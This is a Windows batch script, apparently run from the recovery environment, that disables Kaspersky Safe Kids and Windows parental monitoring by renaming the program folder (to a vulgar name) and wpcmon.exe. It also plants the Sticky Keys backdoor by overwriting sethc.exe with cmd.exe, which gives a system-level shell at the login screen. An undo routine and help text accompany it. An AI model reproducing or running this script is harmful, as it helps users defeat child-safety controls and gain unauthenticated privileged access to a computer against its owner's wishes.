@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Jump to the main argument checking block
goto aroumenting

:stopeed
tasklist /FI "imagename eq explorer.exe" | find "explorer.exe" >nul
IF !errorlevel! == 0 (
    echo It seems like you're in the normal windows session, restarting to winRE
    SET /P restartqueue="Wanna restart to winre?(Y/N) : "
    if "%restartqueue%" == "Y" (
        shutdown /r /o /t 00
    ) else (
        echo You have to do it manualy!
        echo stopping
        goto finish
    )
) ELSE (
    echo It seems like you're already in WinRE.
    goto aroumenting
)

:aroumenting
if "%2" == "/on" (
    goto debugon
) else (
    goto stillcheckanyway
)

:stillcheckanyway
if "%1" == "/do" (
    goto do
)
if "%1" == "/undo" (
    goto undo
)
if "%1" == "/showreadme" (
    goto showreadme
)
if "%1" == "" (
    goto printhelp
) else (
    echo Unknown,stopping
    goto finish
)

:do
C:
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Safe Kids 23.0" "Kaspersky Fuck Kids"
cd ..\..\..
cd Windows\System32
ren sethc.exe sethc1.exe
copy cmd.exe sethc.exe
ren wpcmon.exe wpcmon1.exe
cd ..\..
goto finish

:undo
C:
cd "Program Files (x86)\Kaspersky Lab\"
rename "Kaspersky Fuck Kids" "Kaspersky Safe Kids 23.0"
cd ..\..\..
cd Windows\System32
del sethc.exe
ren sethc1.exe sethc.exe
ren wpcmon1.exe wpcmon.exe
goto finish

:showreadme
if exist readme.md (
    notepad readme.md
) else (
    echo It looks like you didn't download the readme file
)
goto finish

:debugon
@echo on
echo Debug mode is on
echo This mode is for logging and debugging
echo You can ""%0" >> log.txt" for log
goto finish

:printhelp
if not exist assets.txt (
    echo It looks like you didn't download the assets file!
) else (
    goto printmorehelp
)
goto finish

:printmorehelp
SET "file_name=assets.txt"
SET "start_line=1"
SET "end_line=18"
SET "current_line=0"
FOR /F "tokens=*" %%a IN (%file_name%) DO (
    SET /A current_line+=1
    IF !current_line! GEQ !start_line! (
        IF !current_line! LEQ !end_line! (
            ECHO %%a
        )
    )
)
goto finish


:finish
CD %WINDIR%
@echo on